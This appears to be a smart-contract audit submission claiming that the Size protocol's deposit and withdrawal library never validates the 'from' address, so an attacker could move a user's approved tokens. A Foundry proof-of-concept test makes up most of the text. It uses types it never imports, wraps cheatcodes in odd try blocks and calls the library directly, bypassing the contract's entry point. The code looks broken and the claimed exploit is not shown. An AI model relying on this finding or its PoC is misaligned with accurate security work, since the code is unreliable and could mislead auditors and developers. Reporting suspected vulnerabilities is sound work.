# Vulnerability details

## Impact

The problem is that there is no verification of who the from address is, this does not only happen in the DepositTokenLibrary, it happens during the whole process of validation and execution of the deposit/withdrawal.
```
    function validateDeposit(State storage state, DepositParams calldata params) external view {
        // validate msg.sender
        // N/A
```
Based on the permalinks from Github I have linked you can see the whole execution of a deposit and withdrawal, the problem is that if a legitimate user approves a contract to deposit or withdraw, anyone can withdraw/deposit on behalf of the user, this is a real problem.
Let's imagine that a legitimate user approves the Size contract to make a deposit, but a bot tracks the allowance and executes the deposit by assigning "from" as the legitimate user, and "to" assigns to as an attacker.
This would be a serious problem, and all because there is no proper validation on from, and there is no proper validation on to, you can check it in the Github permalinks I have posted.
```
        if (params.to == address(0)) {
            revert Errors.NULL_ADDRESS();
```


## Proof of Concept
Here is a PoC

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "@src/SizeStorage.sol";
import "@src/libraries/DepositTokenLibrary.sol";
import "@test/mocks/WETH.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract MockERC20Token is ERC20 {
    constructor(uint256 initialSupply) ERC20("Mock ERC20 Token", "MERC20") {
        _mint(msg.sender, initialSupply);
    }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function burn(address from, uint256 amount) external { _burn(from, amount); }
}

contract DepositTokenLibraryTest is Test, SizeStorage {
    using DepositTokenLibrary for State;

    WETH private mockUnderlyingCollateralToken;
    MockERC20Token private mockUnderlyingBorrowToken;
    address private user;
    address private attacker;

    function setUp() public {
        mockUnderlyingCollateralToken = new WETH();
        mockUnderlyingBorrowToken = new MockERC20Token(1000000 * 10 ** 18);
        
        state.data.underlyingCollateralToken = IERC20Metadata(address(mockUnderlyingCollateralToken));
        state.data.underlyingBorrowToken = IERC20Metadata(address(mockUnderlyingBorrowToken));
        state.data.collateralToken = NonTransferrableToken(address(mockUnderlyingBorrowToken)); // InternalManagement

        user = vm.addr(1);
        attacker = vm.addr(2);

        mockUnderlyingCollateralToken.deposit{value: 100000 * 10 ** 18}();
        mockUnderlyingCollateralToken.transfer(user, 10000 * 10 ** 18);

    }

    function testDepositUnderlyingCollateralToken() public {
        uint256 amount = 10 * 10 ** 18;
        vm.prank(user);
        mockUnderlyingCollateralToken.approve(address(this), amount);

        bool success = true;
        try vm.prank(user) {
            state.depositUnderlyingCollateralToken(user, user, amount);
        } catch {
            success = false;
        }
        assertTrue(success);
    }

    function testWithdrawUnderlyingCollateralToken() public {
        uint256 amount = 10 * 10 ** 18;
        vm.prank(user);
        mockUnderlyingCollateralToken.approve(address(this), amount);
        vm.prank(user);
        state.depositUnderlyingCollateralToken(user, user, amount);
        
        bool success = true;
        try vm.prank(user) {
            state.withdrawUnderlyingCollateralToken(user, user, amount);
        } catch {
            success = false;
        }
        assertTrue(success);
    }

    function testUnauthorizedDepositByAttacker() public {
        uint256 amount = 10 * 10 ** 18;
        vm.prank(user);
        mockUnderlyingCollateralToken.approve(address(this), amount);

        bool success = true;
        try vm.prank(attacker) {
            state.depositUnderlyingCollateralToken(user, attacker, amount);
        } catch {
            success = false;
        }
        assertTrue(success);
    }

    function testUnauthorizedWithdrawalByAttacker() public {
        uint256 amount = 10 * 10 ** 18;
        vm.prank(user);
        mockUnderlyingCollateralToken.approve(address(this), amount);
        vm.prank(user);
        state.depositUnderlyingCollateralToken(user, user, amount);

        bool success = true;
        try vm.prank(attacker) {
            state.withdrawUnderlyingCollateralToken(user, attacker, amount);
        } catch {
            success = false;
        }
        assertTrue(success);
    }
}

```

No tests are run on the validation functions for simplicity, but as you can see in the Github permalinks, there is no check on the "from", and the "to" only checks that the address is not null.

## Recommended Mitigation Steps

Checks could be added to the "from" or "to" in the validation period, so that the "from" has to be the same address as the "to".
